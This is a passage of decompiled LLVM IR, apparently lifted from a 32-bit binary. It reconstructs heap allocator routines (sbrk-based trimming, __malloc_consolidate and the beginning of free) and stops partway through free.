  %tmp10 = urem i32 %v3_8053b98, %v3_8053b85
  store i32 %tmp10, i32* @edx, align 4
  %v1_8053ba0 = add i32 %div, -1
  %v4_8053ba3 = mul i32 %v1_8053ba0, %v3_8053b85
  store i32 %v4_8053ba3, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8053ba3, 1
  br i1 %tmp11, label %dec_label_pc_8053bff, label %dec_label_pc_8053baa

dec_label_pc_8053baa:                             ; preds = %entry
  %v1_8053baf = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053baf, i32* %edi.global-to-local, align 4
  %v0_8053bb6 = load i32, i32* @esi, align 4
  store i32 %v0_8053bb6, i32* %eax.global-to-local, align 4
  %v1_8053bb8 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053bb8 = add i32 %v1_8053bb8, 44
  %v3_8053bb8 = inttoptr i32 %v2_8053bb8 to i32*
  %v4_8053bb8 = load i32, i32* %v3_8053bb8, align 4
  %v5_8053bb8 = add i32 %v4_8053bb8, %v0_8053bb6
  store i32 %v5_8053bb8, i32* %eax.global-to-local, align 4
  %v12_8053bbe = icmp eq i32 %v1_8053baf, %v5_8053bb8
  %v1_8053bc0 = icmp eq i1 %v12_8053bbe, false
  br i1 %v1_8053bc0, label %dec_label_pc_8053bff, label %dec_label_pc_8053bc2

dec_label_pc_8053bc2:                             ; preds = %dec_label_pc_8053baa
  %v1_8053bc5 = sub i32 0, %v4_8053ba3
  store i32 %v1_8053bc5, i32* @ebx, align 4
  %v1_8053bc8 = call i32 @__GI_sbrk(i32 %v1_8053bc5)
  store i32 %v1_8053bc8, i32* %eax.global-to-local, align 4
  %v1_8053bd4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053bd4, i32* %eax.global-to-local, align 4
  %v10_8053bdc = icmp eq i32 %v1_8053bd4, -1
  br i1 %v10_8053bdc, label %dec_label_pc_8053bff, label %dec_label_pc_8053be1

dec_label_pc_8053be1:                             ; preds = %dec_label_pc_8053bc2
  %v0_8053be1 = load i32, i32* %edi.global-to-local, align 4
  %v2_8053be3 = sub i32 %v0_8053be1, %v1_8053bd4
  %v12_8053be3 = icmp eq i32 %v2_8053be3, 0
  store i32 %v2_8053be3, i32* @ecx, align 4
  br i1 %v12_8053be3, label %dec_label_pc_8053bff, label %dec_label_pc_8053be7

dec_label_pc_8053be7:                             ; preds = %dec_label_pc_8053be1
  %v0_8053be7 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8053be7 = add i32 %v0_8053be7, 44
  %v2_8053be7 = inttoptr i32 %v1_8053be7 to i32*
  %v3_8053be7 = load i32, i32* %v2_8053be7, align 4
  store i32 %v3_8053be7, i32* %eax.global-to-local, align 4
  %v1_8053bea = add i32 %v0_8053be7, 872
  %v2_8053bea = inttoptr i32 %v1_8053bea to i32*
  %v3_8053bea = load i32, i32* %v2_8053bea, align 4
  %v5_8053bea = sub i32 %v3_8053bea, %v2_8053be3
  store i32 %v5_8053bea, i32* %v2_8053bea, align 4
  %v0_8053bf0 = load i32, i32* @esi, align 4
  %v1_8053bf0 = load i32, i32* @ecx, align 4
  %v2_8053bf0 = sub i32 %v0_8053bf0, %v1_8053bf0
  %v1_8053bf2 = or i32 %v2_8053bf0, 1
  %v1_8053bf5 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053bf5 = add i32 %v1_8053bf5, 4
  %v3_8053bf5 = inttoptr i32 %v2_8053bf5 to i32*
  store i32 %v1_8053bf2, i32* %v3_8053bf5, align 4
  br label %dec_label_pc_8053c01

dec_label_pc_8053bff:                             ; preds = %dec_label_pc_8053be1, %dec_label_pc_8053bc2, %dec_label_pc_8053baa, %entry
  br label %dec_label_pc_8053c01

dec_label_pc_8053c01:                             ; preds = %dec_label_pc_8053be7, %dec_label_pc_8053bff
  %storemerge = phi i32 [ 1, %dec_label_pc_8053be7 ], [ 0, %dec_label_pc_8053bff ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8053bd4, { 1, 0, 2 }
  uselistorder i32 %v4_8053ba3, { 1, 2, 0 }
  uselistorder i32 %v3_8053b85, { 0, 3, 2, 1, 4 }
  uselistorder i32 (i32)* @__GI_sbrk, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053c01, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_8053c0a = load i32, i32* @edi, align 4
  %v0_8053c0b = load i32, i32* @esi, align 4
  %v0_8053c0c = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8053c14 = load i32, i32* %arg1, align 4
  store i32 %v2_8053c14, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8053c1b = icmp eq i32 %v2_8053c14, 0
  br i1 %v1_8053c1b, label %dec_label_pc_8053d44.preheader, label %dec_label_pc_8053c23

dec_label_pc_8053d44.preheader:                   ; preds = %entry
  %v3_8053d39 = add i32 %tmp11, 44
  br label %dec_label_pc_8053d35

dec_label_pc_8053c23:                             ; preds = %entry
  %v1_8053c27 = and i32 %v2_8053c14, -3
  store i32 %v1_8053c27, i32* %arg1, align 4
  %v1_8053c2c = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_8053c37 = add i32 %tmp11, 4
  store i32 %v1_8053c37, i32* %eax.global-to-local, align 4
  %v2_8053c42 = load i32, i32* %arg1, align 4
  %v2_8053c48 = udiv i32 %v2_8053c42, 8
  %v2_8053c4b = mul nuw i32 %v2_8053c48, 4
  %v3_8053c4b = add i32 %tmp11, -4
  %v4_8053c4b = add i32 %v3_8053c4b, %v2_8053c4b
  store i32 %v4_8053c4b, i32* %eax.global-to-local, align 4
  %v2_8053d12 = add i32 %tmp11, 44
  %v3_8053d12 = inttoptr i32 %v2_8053d12 to i32*
  %v1_8053ce5 = add i32 %tmp11, 60
  %v2_8053ce5 = inttoptr i32 %v1_8053ce5 to i32*
  br label %dec_label_pc_8053c53

dec_label_pc_8053c53:                             ; preds = %dec_label_pc_8053d2b, %dec_label_pc_8053c23
  %v0_8053c61 = phi i32 [ %v1_8053c37, %dec_label_pc_8053c23 ], [ %v4_8053d2b, %dec_label_pc_8053d2b ]
  store i32 %v0_8053c61, i32* %eax.global-to-local, align 4
  %v1_8053c57 = inttoptr i32 %v0_8053c61 to i32*
  %v2_8053c57 = load i32, i32* %v1_8053c57, align 4
  store i32 %v2_8053c57, i32* @ecx, align 4
  %v1_8053c59 = icmp eq i32 %v2_8053c57, 0
  br i1 %v1_8053c59, label %dec_label_pc_8053d21, label %dec_label_pc_8053c61

dec_label_pc_8053c61:                             ; preds = %dec_label_pc_8053c53
  store i32 0, i32* %v1_8053c57, align 4
  %v0_8053c67.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8053c67

dec_label_pc_8053c67:                             ; preds = %dec_label_pc_8053d15, %dec_label_pc_8053c61
  %v0_8053c84 = phi i32 [ %v3_8053c67, %dec_label_pc_8053d15 ], [ %v0_8053c67.pre, %dec_label_pc_8053c61 ]
  %v1_8053c67 = add i32 %v0_8053c84, 8
  %v2_8053c67 = inttoptr i32 %v1_8053c67 to i32*
  %v3_8053c67 = load i32, i32* %v2_8053c67, align 4
  store i32 %v3_8053c67, i32* %edx.global-to-local, align 4
  %v1_8053c6e = add i32 %v0_8053c84, 4
  %v2_8053c6e = inttoptr i32 %v1_8053c6e to i32*
  %v3_8053c6e = load i32, i32* %v2_8053c6e, align 4
  store i32 %v3_8053c6e, i32* %eax.global-to-local, align 4
  %v1_8053c73 = and i32 %v3_8053c6e, -2
  store i32 %v1_8053c73, i32* @edi, align 4
  %v2_8053c76 = urem i32 %v3_8053c6e, 2
  %v3_8053c76 = icmp eq i32 %v2_8053c76, 0
  %v2_8053c78 = add i32 %v1_8053c73, %v0_8053c84
  store i32 %v2_8053c78, i32* @ebx, align 4
  %v1_8053c7b = add i32 %v2_8053c78, 4
  %v2_8053c7b = inttoptr i32 %v1_8053c7b to i32*
  %v3_8053c7b = load i32, i32* %v2_8053c7b, align 4
  store i32 %v3_8053c7b, i32* %edx.global-to-local, align 4
  %v1_8053c82 = icmp eq i1 %v3_8053c76, false
  br i1 %v1_8053c82, label %dec_label_pc_8053ca4, label %dec_label_pc_8053c84

dec_label_pc_8053c84:                             ; preds = %dec_label_pc_8053c67
  %v1_8053c84 = inttoptr i32 %v0_8053c84 to i32*
  %v2_8053c84 = load i32, i32* %v1_8053c84, align 4
  store i32 %v2_8053c84, i32* %ebp.global-to-local, align 4
  %v2_8053c88 = sub i32 %v0_8053c84, %v2_8053c84
  store i32 %v2_8053c88, i32* %eax.global-to-local, align 4
  %v1_8053c8a = add i32 %v2_8053c88, 8
  %v2_8053c8a = inttoptr i32 %v1_8053c8a to i32*
  %v3_8053c8a = load i32, i32* %v2_8053c8a, align 4
  store i32 %v3_8053c8a, i32* @esi, align 4
  %v1_8053c8d = add i32 %v2_8053c88, 12
  %v2_8053c8d = inttoptr i32 %v1_8053c8d to i32*
  %v3_8053c8d = load i32, i32* %v2_8053c8d, align 4
  store i32 %v3_8053c8d, i32* %edx.global-to-local, align 4
  %v1_8053c90 = add i32 %v3_8053c8a, 12
  %v2_8053c90 = inttoptr i32 %v1_8053c90 to i32*
  %v3_8053c90 = load i32, i32* %v2_8053c90, align 4
  store i32 %v3_8053c90, i32* @ecx, align 4
  %v12_8053c93 = icmp eq i32 %v3_8053c90, %v2_8053c88
  %v1_8053c95 = icmp eq i1 %v12_8053c93, false
  br i1 %v1_8053c95, label %dec_label_pc_8053cd4, label %dec_label_pc_8053c97

dec_label_pc_8053c97:                             ; preds = %dec_label_pc_8053c84
  %v1_8053c97 = add i32 %v3_8053c8d, 8
  %v2_8053c97 = inttoptr i32 %v1_8053c97 to i32*
  %v3_8053c97 = load i32, i32* %v2_8053c97, align 4
  %v15_8053c97 = icmp eq i32 %v3_8053c97, %v3_8053c90
  %v1_8053c9a = icmp eq i1 %v15_8053c97, false
  br i1 %v1_8053c9a, label %dec_label_pc_8053cd4, label %dec_label_pc_8053c9c

dec_label_pc_8053c9c:                             ; preds = %dec_label_pc_8053c97
  %v2_8053c9c = add i32 %v2_8053c84, %v1_8053c73
  store i32 %v2_8053c9c, i32* @edi, align 4
  store i32 %v3_8053c8d, i32* %v2_8053c90, align 4
  %v0_8053ca1 = load i32, i32* @esi, align 4
  %v1_8053ca1 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053ca1 = add i32 %v1_8053ca1, 8
  %v3_8053ca1 = inttoptr i32 %v2_8053ca1 to i32*
  store i32 %v0_8053ca1, i32* %v3_8053ca1, align 4
  %v0_8053caf.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053ca4

dec_label_pc_8053ca4:                             ; preds = %dec_label_pc_8053c67, %dec_label_pc_8053c9c
  %v1_8053cb8 = phi i32 [ %v2_8053c78, %dec_label_pc_8053c67 ], [ %v0_8053caf.pre, %dec_label_pc_8053c9c ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8053cac = and i32 %v3_8053c7b, -4
  store i32 %v1_8053cac, i32* %ebp.global-to-local, align 4
  %v4_8053caf = load i32, i32* %v3_8053d12, align 4
  %v15_8053caf = icmp eq i32 %v1_8053cb8, %v4_8053caf
  br i1 %v15_8053caf, label %dec_label_pc_8053d05, label %dec_label_pc_8053cb4

dec_label_pc_8053cb4:                             ; preds = %dec_label_pc_8053ca4
  %v2_8053cb4 = add i32 %v1_8053cb8, 4
  %v3_8053cb4 = add i32 %v2_8053cb4, %v1_8053cac
  %v4_8053cb4 = inttoptr i32 %v3_8053cb4 to i32*
  %v5_8053cb4 = load i32, i32* %v4_8053cb4, align 4
  store i32 %v5_8053cb4, i32* %eax.global-to-local, align 4
  %v3_8053cb8 = inttoptr i32 %v2_8053cb4 to i32*
  store i32 %v1_8053cac, i32* %v3_8053cb8, align 4
  %v0_8053cbb = load i32, i32* %eax.global-to-local, align 4
  %v1_8053cbb = urem i32 %v0_8053cbb, 2
  %v2_8053cbb = icmp eq i32 %v1_8053cbb, 0
  store i32 %v1_8053cbb, i32* %eax.global-to-local, align 4
  %v1_8053cc0 = icmp eq i1 %v2_8053cbb, false
  br i1 %v1_8053cc0, label %dec_label_pc_8053ce1, label %dec_label_pc_8053cc2

dec_label_pc_8053cc2:                             ; preds = %dec_label_pc_8053cb4
  %v0_8053cc2 = load i32, i32* @ebx, align 4
  %v1_8053cc2 = add i32 %v0_8053cc2, 8
  %v2_8053cc2 = inttoptr i32 %v1_8053cc2 to i32*
  %v3_8053cc2 = load i32, i32* %v2_8053cc2, align 4
  store i32 %v3_8053cc2, i32* @edx, align 4
  %v1_8053cc5 = add i32 %v0_8053cc2, 12
  %v2_8053cc5 = inttoptr i32 %v1_8053cc5 to i32*
  %v3_8053cc5 = load i32, i32* %v2_8053cc5, align 4
  store i32 %v3_8053cc5, i32* %eax.global-to-local, align 4
  %v1_8053cc8 = add i32 %v3_8053cc2, 12
  %v2_8053cc8 = inttoptr i32 %v1_8053cc8 to i32*
  %v3_8053cc8 = load i32, i32* %v2_8053cc8, align 4
  store i32 %v3_8053cc8, i32* @esi, align 4
  %v12_8053ccb = icmp eq i32 %v3_8053cc8, %v0_8053cc2
  %v1_8053ccd = icmp eq i1 %v12_8053ccb, false
  br i1 %v1_8053ccd, label %dec_label_pc_8053cd4, label %dec_label_pc_8053ccf

dec_label_pc_8053ccf:                             ; preds = %dec_label_pc_8053cc2
  %v1_8053ccf = add i32 %v3_8053cc5, 8
  %v2_8053ccf = inttoptr i32 %v1_8053ccf to i32*
  %v3_8053ccf = load i32, i32* %v2_8053ccf, align 4
  %v15_8053ccf = icmp eq i32 %v3_8053ccf, %v3_8053cc8
  br i1 %v15_8053ccf, label %dec_label_pc_8053cd9, label %dec_label_pc_8053cd4

dec_label_pc_8053cd4:                             ; preds = %dec_label_pc_8053ccf, %dec_label_pc_8053cc2, %dec_label_pc_8053c97, %dec_label_pc_8053c84
  %v0_8053cd4 = call i32 @abort()
  store i32 %v0_8053cd4, i32* %eax.global-to-local, align 4
  %v1_8053cdb.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053cd9

dec_label_pc_8053cd9:                             ; preds = %dec_label_pc_8053ccf, %dec_label_pc_8053cd4
  %v1_8053cdb = phi i32 [ %v3_8053cc2, %dec_label_pc_8053ccf ], [ %v1_8053cdb.pre, %dec_label_pc_8053cd4 ]
  %v0_8053cdb = phi i32 [ %v3_8053cc5, %dec_label_pc_8053ccf ], [ %v0_8053cd4, %dec_label_pc_8053cd4 ]
  %v0_8053cd9 = load i32, i32* @edi, align 4
  %v1_8053cd9 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053cd9 = add i32 %v1_8053cd9, %v0_8053cd9
  store i32 %v2_8053cd9, i32* @edi, align 4
  %v2_8053cdb = add i32 %v1_8053cdb, 12
  %v3_8053cdb = inttoptr i32 %v2_8053cdb to i32*
  store i32 %v0_8053cdb, i32* %v3_8053cdb, align 4
  %v0_8053cde = load i32, i32* @edx, align 4
  %v1_8053cde = load i32, i32* %eax.global-to-local, align 4
  %v2_8053cde = add i32 %v1_8053cde, 8
  %v3_8053cde = inttoptr i32 %v2_8053cde to i32*
  store i32 %v0_8053cde, i32* %v3_8053cde, align 4
  br label %dec_label_pc_8053ce1

dec_label_pc_8053ce1:                             ; preds = %dec_label_pc_8053cb4, %dec_label_pc_8053cd9
  store i32 %v1_8053c2c, i32* %eax.global-to-local, align 4
  %v3_8053ce5 = load i32, i32* %v2_8053ce5, align 4
  store i32 %v3_8053ce5, i32* @edx, align 4
  %v0_8053ce8 = load i32, i32* @ecx, align 4
  store i32 %v0_8053ce8, i32* %v2_8053ce5, align 4
  %v0_8053ceb = load i32, i32* @edi, align 4
  %v1_8053ced = or i32 %v0_8053ceb, 1
  store i32 %v1_8053ced, i32* %eax.global-to-local, align 4
  %v0_8053cf0 = load i32, i32* @ecx, align 4
  %v1_8053cf0 = load i32, i32* @edx, align 4
  %v2_8053cf0 = add i32 %v1_8053cf0, 12
  %v3_8053cf0 = inttoptr i32 %v2_8053cf0 to i32*
  store i32 %v0_8053cf0, i32* %v3_8053cf0, align 4
  %v0_8053cf3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053cf3 = load i32, i32* @ecx, align 4
  %v2_8053cf3 = add i32 %v1_8053cf3, 4
  %v3_8053cf3 = inttoptr i32 %v2_8053cf3 to i32*
  store i32 %v0_8053cf3, i32* %v3_8053cf3, align 4
  store i32 %v1_8053c2c, i32* %eax.global-to-local, align 4
  %v0_8053cfa = load i32, i32* @edx, align 4
  %v1_8053cfa = load i32, i32* @ecx, align 4
  %v2_8053cfa = add i32 %v1_8053cfa, 8
  %v3_8053cfa = inttoptr i32 %v2_8053cfa to i32*
  store i32 %v0_8053cfa, i32* %v3_8053cfa, align 4
  %v0_8053cfd = load i32, i32* %eax.global-to-local, align 4
  %v1_8053cfd = load i32, i32* @ecx, align 4
  %v2_8053cfd = add i32 %v1_8053cfd, 12
  %v3_8053cfd = inttoptr i32 %v2_8053cfd to i32*
  store i32 %v0_8053cfd, i32* %v3_8053cfd, align 4
  %v0_8053d00 = load i32, i32* @edi, align 4
  %v1_8053d00 = load i32, i32* @ecx, align 4
  %v3_8053d00 = add i32 %v1_8053d00, %v0_8053d00
  %v4_8053d00 = inttoptr i32 %v3_8053d00 to i32*
  store i32 %v0_8053d00, i32* %v4_8053d00, align 4
  br label %dec_label_pc_8053d15

dec_label_pc_8053d05:                             ; preds = %dec_label_pc_8053ca4
  %v0_8053d05 = load i32, i32* @edi, align 4
  %v2_8053d05 = add i32 %v0_8053d05, %v1_8053cac
  %v1_8053d08 = or i32 %v2_8053d05, 1
  store i32 %v1_8053d08, i32* %eax.global-to-local, align 4
  %v1_8053d0b = load i32, i32* @ecx, align 4
  %v2_8053d0b = add i32 %v1_8053d0b, 4
  %v3_8053d0b = inttoptr i32 %v2_8053d0b to i32*
  store i32 %v1_8053d08, i32* %v3_8053d0b, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_8053d12 = load i32, i32* @ecx, align 4
  store i32 %v0_8053d12, i32* %v3_8053d12, align 4
  br label %dec_label_pc_8053d15

dec_label_pc_8053d15:                             ; preds = %dec_label_pc_8053ce1, %dec_label_pc_8053d05
  store i32 %v3_8053c67, i32* @ecx, align 4
  %v1_8053d19 = icmp eq i32 %v3_8053c67, 0
  %v1_8053d1b = icmp eq i1 %v1_8053d19, false
  br i1 %v1_8053d1b, label %dec_label_pc_8053c67, label %dec_label_pc_8053d21

dec_label_pc_8053d21:                             ; preds = %dec_label_pc_8053d15, %dec_label_pc_8053c53
  store i32 %v4_8053c4b, i32* @ecx, align 4
  %v15_8053d25 = icmp eq i32 %v0_8053c61, %v4_8053c4b
  br i1 %v15_8053d25, label %dec_label_pc_8053da9, label %dec_label_pc_8053d2b

dec_label_pc_8053d2b:                             ; preds = %dec_label_pc_8053d21
  %v4_8053d2b = add i32 %v0_8053c61, 4
  br label %dec_label_pc_8053c53

dec_label_pc_8053d35:                             ; preds = %dec_label_pc_8053d44.preheader, %dec_label_pc_8053d35
  %v1_8053d3920 = phi i32 [ 1, %dec_label_pc_8053d44.preheader ], [ %v0_8053d44.pre, %dec_label_pc_8053d35 ]
  %v2_8053d39 = mul i32 %v1_8053d3920, 8
  %v4_8053d39 = add i32 %v3_8053d39, %v2_8053d39
  store i32 %v4_8053d39, i32* %eax.global-to-local, align 4
  %v1_8053d3d = add i32 %v1_8053d3920, 1
  store i32 %v1_8053d3d, i32* %edx.global-to-local, align 4
  %v2_8053d3e = add i32 %v4_8053d39, 12
  %v3_8053d3e = inttoptr i32 %v2_8053d3e to i32*
  store i32 %v4_8053d39, i32* %v3_8053d3e, align 4
  %v0_8053d41 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053d41 = add i32 %v0_8053d41, 8
  %v3_8053d41 = inttoptr i32 %v2_8053d41 to i32*
  store i32 %v0_8053d41, i32* %v3_8053d41, align 4
  %v0_8053d44.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_8053d47 = icmp sgt i32 %v0_8053d44.pre, 95
  br i1 %v7_8053d47, label %dec_label_pc_8053d49, label %dec_label_pc_8053d35

dec_label_pc_8053d49:                             ; preds = %dec_label_pc_8053d35
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8053d4d = add i32 %tmp11, 864
  %v2_8053d4d = inttoptr i32 %v1_8053d4d to i32*
  %v3_8053d4d = load i32, i32* %v2_8053d4d, align 4
  %v4_8053d4d = or i32 %v3_8053d4d, 1
  store i32 %v4_8053d4d, i32* %v2_8053d4d, align 4
  %v0_8053d54 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053d54 = add i32 %v0_8053d54, 840
  %v2_8053d54 = inttoptr i32 %v1_8053d54 to i32*
  store i32 0, i32* %v2_8053d54, align 4
  %v0_8053d5e = load i32, i32* %eax.global-to-local, align 4
  %v1_8053d5e = add i32 %v0_8053d5e, 852
  %v2_8053d5e = inttoptr i32 %v1_8053d5e to i32*
  store i32 65536, i32* %v2_8053d5e, align 4
  %v0_8053d68 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053d68 = add i32 %v0_8053d68, 844
  %v2_8053d68 = inttoptr i32 %v1_8053d68 to i32*
  store i32 262144, i32* %v2_8053d68, align 4
  %v0_8053d72 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053d72 = add i32 %v0_8053d72, 836
  %v2_8053d72 = inttoptr i32 %v1_8053d72 to i32*
  store i32 262144, i32* %v2_8053d72, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_8053d83 = load i32, i32* %arg1, align 4
  %v1_8053d85 = urem i32 %v2_8053d83, 4
  %v1_8053d88 = or i32 %v1_8053d85, 72
  store i32 %v1_8053d88, i32* %arg1, align 4
  %v0_8053d8d = load i32, i32* @edx, align 4
  %v1_8053d8f = add i32 %v0_8053d8d, 52
  store i32 %v1_8053d8f, i32* %eax.global-to-local, align 4
  %v2_8053d92 = add i32 %v0_8053d8d, 44
  %v3_8053d92 = inttoptr i32 %v2_8053d92 to i32*
  store i32 %v1_8053d8f, i32* %v3_8053d92, align 4
  %v1_8053d97 = call i32 @sysconf(i32 30)
  store i32 %v1_8053d97, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_8053da3 = add i32 %tmp11, 860
  %v3_8053da3 = inttoptr i32 %v2_8053da3 to i32*
  store i32 %v1_8053d97, i32* %v3_8053da3, align 4
  br label %dec_label_pc_8053da9

dec_label_pc_8053da9:                             ; preds = %dec_label_pc_8053d21, %dec_label_pc_8053d49
  store i32 %v0_8053c0c, i32* @ebx, align 4
  store i32 %v0_8053c0b, i32* @esi, align 4
  store i32 %v0_8053c0a, i32* @edi, align 4
  %v0_8053db0 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8053db0

; uselistorder directives
  uselistorder i32 %v0_8053d41, { 1, 0 }
  uselistorder i32 %v0_8053d00, { 1, 0 }
  uselistorder i32 %v1_8053cbb, { 1, 0 }
  uselistorder i32 %v2_8053cb4, { 1, 0 }
  uselistorder i32 %v1_8053cac, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053cb8, { 1, 0 }
  uselistorder i32 %v3_8053c67, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8053c84, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8053c61, { 1, 0, 3, 2 }
  uselistorder i32* %v3_8053d12, { 1, 0 }
  uselistorder i32 %v1_8053c2c, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_8053da9, { 1, 0 }
  uselistorder label %dec_label_pc_8053d35, { 1, 0 }
  uselistorder label %dec_label_pc_8053d15, { 1, 0 }
  uselistorder label %dec_label_pc_8053ce1, { 1, 0 }
  uselistorder label %dec_label_pc_8053cd9, { 1, 0 }
  uselistorder label %dec_label_pc_8053ca4, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8053db1 = load i32, i32* @ebp, align 4
  %v0_8053db2 = load i32, i32* @edi, align 4
  %v0_8053db3 = load i32, i32* @esi, align 4
  %v0_8053db4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8053dbc = icmp eq i32 %arg1, 0
  br i1 %v1_8053dbc, label %dec_label_pc_8053f45, label %dec_label_pc_8053dc4

dec_label_pc_8053dc4:                             ; preds = %entry
  %v2_8053dcf = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053dcf, i32* @eax, align 4
  %v2_8053dd4 = call i32 @__pthread_return_void(i32 %v2_8053dcf, i32 134564459)
  store i32 %v2_8053dd4, i32* %eax.global-to-local, align 4
  %v1_8053de0 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d330.522 to i32))
  %v1_8053de5 = add i32 %arg1, -8
  store i32 %v1_8053de5, i32* @ecx, align 4
  %v0_8053de8 = load i8, i8* @global_var_80637a0.523, align 1
  %v1_8053de8 = sext i8 %v0_8053de8 to i32
  store i32 %v1_8053de8, i32* %eax.global-to-local, align 4
  %v1_8053df0 = add i32 %arg1, -4
  %v2_8053df0 = inttoptr i32 %v1_8053df0 to i32*
  %v3_8053df0 = load i32, i32* %v2_8053df0, align 4
  %v1_8053df5 = and i32 %v3_8053df0, -4
  %v4_8053df5 = trunc i32 %v1_8053df5 to i8
  store i32 %v1_8053df5, i32* @ebx, align 4
  %v8_8053dfa = icmp ugt i8 %v4_8053df5, %v0_8053de8
  br i1 %v8_8053dfa, label %dec_label_pc_8053e1c, label %dec_label_pc_8053dfc

dec_label_pc_8053dfc:                             ; preds = %dec_label_pc_8053dc4
  %v2_8053dfc = udiv i32 %v3_8053df0, 8
  %v1_8053dff = or i32 %v1_8053de8, 3
  %v3_8053dff = trunc i32 %v1_8053dff to i8
  store i32 %v1_8053dff, i32* %eax.global-to-local, align 4
  store i8 %v3_8053dff, i8* @global_var_80637a0.523, align 32
  %v1_8053e07 = mul nuw i32 %v2_8053dfc, 4
  %v2_8053e07 = add i32 %v1_8053e07, ptrtoint (i8* @global_var_80637a0.523 to i32)
  store i32 %v2_8053e07, i32* @edx, align 4
  %v1_8053e0e = add i32 %v1_8053e07, add (i32 ptrtoint (i8* @global_var_80637a0.523 to i32), i32 -4)
  %v2_8053e0e = inttoptr i32 %v1_8053e0e to i32*
  %v3_8053e0e = load i32, i32* %v2_8053e0e, align 4
  store i32 %v3_8053e0e, i32* %eax.global-to-local, align 4
  %v3_8053e11 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8053e0e, i32* %v3_8053e11, align 4
  %v0_8053e14 = load i32, i32* @ecx, align 4
  %v1_8053e14 = load i32, i32* @edx, align 4
  %v2_8053e14 = add i32 %v1_8053e14, -4
  %v3_8053e14 = inttoptr i32 %v2_8053e14 to i32*
  store i32 %v0_8053e14, i32* %v3_8053e14, align 4
  br label %dec_label_pc_8053f34

dec_label_pc_8053e1c:                             ; preds = %dec_label_pc_8053dc4
  %v1_8053e1c = trunc i32 %v3_8053df0 to i8
  %v2_8053e1c = and i8 %v1_8053e1c, 2
  %v3_8053e1c = icmp eq i8 %v2_8053e1c, 0
  %v5_8053e1c = zext i8 %v2_8053e1c to i32
  %v7_8053e1c = and i32 %v3_8053df0, -256
  %v8_8053e1c = or i32 %v5_8053e1c, %v7_8053e1c
  store i32 %v8_8053e1c, i32* @edx, align 4
  %v1_8053e1f = icmp eq i1 %v3_8053e1c, false
  br i1 %v1_8053e1f, label %dec_label_pc_8053f14, label %dec_label_pc_8053e25

dec_label_pc_8053e25:                             ; preds = %dec_label_pc_8053e1c
  %v1_8053e25 = or i32 %v1_8053de8, 1
  %v3_8053e25 = trunc i32 %v1_8053e25 to i8
  store i32 %v1_8053e25, i32* %eax.global-to-local, align 4
  %v2_8053e28 = add i32 %v1_8053df5, %v1_8053de5
  store i32 %v2_8053e28, i32* @esi, align 4
  store i8 %v3_8053e25, i8* @global_var_80637a0.523, align 32
  %v1_8053e30 = add i32 %v2_8053e28, 4
  %v2_8053e30 = inttoptr i32 %v1_8053e30 to i32*
  %v3_8053e30 = load i32, i32* %v2_8053e30, align 4
  store i32 %v3_8053e30, i32* %eax.global-to-local, align 4
  %v2_8053e37 = inttoptr i32 %v1_8053df0 to i8*
  %v3_8053e37 = load i8, i8* %v2_8053e37, align 1
  %v4_8053e37 = urem i8 %v3_8053e37, 2
  %v5_8053e37 = icmp eq i8 %v4_8053e37, 0
  %v1_8053e3b = icmp eq i1 %v5_8053e37, false
  br i1 %v1_8053e3b, label %dec_label_pc_8053e5e, label %dec_label_pc_8053e3d

dec_label_pc_8053e3d:                             ; preds = %dec_label_pc_8053e25
  %v2_8053e3d = inttoptr i32 %v1_8053de5 to i32*
  %v3_8053e3d = load i32, i32* %v2_8053e3d, align 4
  store i32 %v3_8053e3d, i32* @ebp, align 4
